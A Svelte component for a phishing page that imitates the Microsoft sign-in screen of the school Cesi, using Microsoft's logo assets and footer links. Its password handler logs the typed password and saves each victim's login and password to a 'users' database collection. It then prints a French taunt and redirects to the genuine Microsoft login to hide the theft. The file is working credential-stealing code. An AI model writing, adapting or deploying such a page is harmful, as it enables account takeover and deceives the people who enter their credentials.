<script>
  import LoginForm from "./LoginForm.svelte";
  import PasswordForm from "./PasswordForm.svelte";

  export var db;

  var login;

  var showLogin = true;

  function onLoginFormNext(event) {
    login = event.detail.login;
    showLogin = false;
  }

  function onPasswordBack() {
    showLogin = true;
  }

  function onPasswordNext(event) {
    var password = event.detail.password;
    console.debug(password);
    db.collection("users")
      .add({
        login,
        password
      })
      .then(x => {
        console.log("bien niqué !", x);
        window.location = "https://login.microsoftonline.com/common/oauth2";
      })
      .catch(console.error);
  }
</script>

<style>
  .background-image-holder {
    background-color: black;
  }
  .background-image {
    -webkit-animation: MsfadeIn 1s;
    -moz-animation: MsfadeIn 1s;
    -o-animation: MsfadeIn 1s;
    animation: MsfadeIn 1s;
    opacity: 0.45;
  }

  @keyframes MsfadeIn {
    from {
      opacity: 0;
    }
    to {
      opacity: 0.45;
    }
  }
  .footer {
    left: 0;
  }
</style>

<div>
  <div>
    <div class="background-image-holder" role="presentation">
      <div
        style="background-image: url('/assets/images/cesi-bg.png');"
        class="background-image ext-background-image" />
    </div>
  </div>
  <div />
  <div name="f1" id="i0281">
    <div class="outer">
      <div class="middle">
        <div class="sign-in-box ext-sign-in-box fade-in-lightbox">
          <div class="lightbox-cover" />
          <div class="win-scroll">
            <div>
              <img
                class="banner-logo"
                role="img"
                src="https://aadcdn.msauthimages.net/c1c6b6c8-4x0fz3tpuqalozimlqlchw2vidmtqpbgr8y6rbtgems/logintenantbranding/0/bannerlogo?ts=636730105407941692"
                alt="Cesi" />
              {#if showLogin}
                <LoginForm on:next={onLoginFormNext} />
              {:else}
                <PasswordForm
                  {login}
                  on:back={onPasswordBack}
                  on:next={onPasswordNext} />
              {/if}
            </div>
          </div>
          <div id="footer" role="contentinfo" class="default footer ext-footer">
            <div id="footerLinks" class="footerNode text-secondary">
              <a
                id="ftrTerms"
                href="https://www.microsoft.com/en-US/servicesagreement/">
                Terms of use
              </a>
              <a
                id="ftrPrivacy"
                href="https://privacy.microsoft.com/en-US/privacystatement">
                Privacy &amp; cookies
              </a>
              <a
                id="moreOptions"
                href="/"
                target="_blank"
                role="button"
                class="moreOptions">
                <img
                  class="desktopMode"
                  role="presentation"
                  alt="•••"
                  src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" />
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
